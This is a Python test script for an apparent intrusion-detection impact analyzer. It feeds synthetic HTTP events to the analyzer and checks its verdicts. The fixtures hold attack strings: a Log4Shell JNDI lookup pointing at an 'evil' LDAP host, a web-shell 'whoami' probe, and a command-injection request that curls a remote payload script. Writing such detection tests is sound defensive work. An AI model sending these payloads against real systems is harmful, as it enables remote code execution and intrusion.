from __future__ import annotations

import sys
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parents[1]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from src.correlation.impact_analyzer import assess_impact
from src.event.models import HttpEvent


def main() -> None:
    event = HttpEvent(
        event_id="pkt-1",
        timestamp=1.0,
        src_ip="10.0.0.1",
        src_port=12345,
        dst_ip="10.0.0.2",
        dst_port=80,
        protocol="HTTP",
        payload_clean="GET /?x=${jndi:ldap://evil/a} HTTP/1.1",
        summary="exploit",
        method="GET",
        uri="/?x=${jndi:ldap://evil/a}",
        host="victim",
        user_agent="demo",
        headers={},
    )
    impact = assess_impact(
        [event],
        [
            {
                "stage": "Exploitation",
                "confidence": "high",
                "evidence_ids": ["pkt-1"],
            }
        ],
        [],
        [{"cve": "CVE-2021-44228", "rule_confirmed": True, "final_score": 0.8}],
    )
    assert impact["verdict"] == "Likely exploitation attempt"
    assert "CVE-2021-44228" in impact["related_cves"]

    rejected_cmd = HttpEvent(
        event_id="pkt-4",
        timestamp=2.0,
        src_ip="10.0.0.1",
        src_port=12346,
        dst_ip="10.0.0.2",
        dst_port=80,
        protocol="HTTP",
        payload_clean="GET /shell?cmd=whoami HTTP/1.1",
        summary="command probe",
        method="GET",
        uri="/shell?cmd=whoami",
        host="victim",
        user_agent="curl",
        headers={},
        status_code=404,
    )
    rejected_download = HttpEvent(
        event_id="pkt-5",
        timestamp=3.0,
        src_ip="10.0.0.1",
        src_port=12347,
        dst_ip="10.0.0.2",
        dst_port=80,
        protocol="HTTP",
        payload_clean="GET /api?cmd=curl%20http://203.0.113.50/payload.sh HTTP/1.1",
        summary="download probe",
        method="GET",
        uri="/api?cmd=curl%20http://203.0.113.50/payload.sh",
        host="victim",
        user_agent="curl",
        headers={},
        status_code=404,
    )
    rejected_impact = assess_impact(
        [rejected_cmd, rejected_download],
        [
            {"stage": "Command Execution", "confidence": "medium", "evidence_ids": ["pkt-4"]},
            {"stage": "Payload Delivery", "confidence": "medium", "evidence_ids": ["pkt-5"]},
        ],
        [],
        [],
    )
    assert rejected_impact["verdict"] == "Possible exploitation attempt"
    assert rejected_impact["confidence"] == "low"
    assert "4xx" in rejected_impact["missing_evidence"][-1]


if __name__ == "__main__":
    main()
